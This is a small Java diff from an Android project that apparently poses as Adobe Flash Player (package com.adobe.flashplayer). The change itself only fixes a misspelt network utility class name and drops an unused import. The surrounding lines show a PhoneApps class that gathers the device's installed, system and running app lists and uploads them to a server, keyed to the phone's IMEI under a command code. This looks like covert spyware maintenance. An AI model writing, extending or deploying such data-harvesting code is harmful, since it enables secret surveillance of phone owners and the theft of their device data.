@@ -4,7 +4,7 @@ package com.adobe.flashplayer.data;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 import java.util.List;
 import org.json.JSONArray;
@@ -15,7 +15,6 @@ import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import androidx.core.content.ContextCompat;
 import android.util.Log;
 
 
@@ -91,7 +90,7 @@ public class PhoneApps {
                 jsarray.put(1, jsarraysys);
                 jsarray.put(2, jsarrayrun);
 
-                if (NetworkUitls.isNetworkAvailable(context)) {
+                if (NetworkUtils.isNetworkAvailable(context)) {
                     UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_APPPROCESS, Public.IMEI);
                 }else{
 
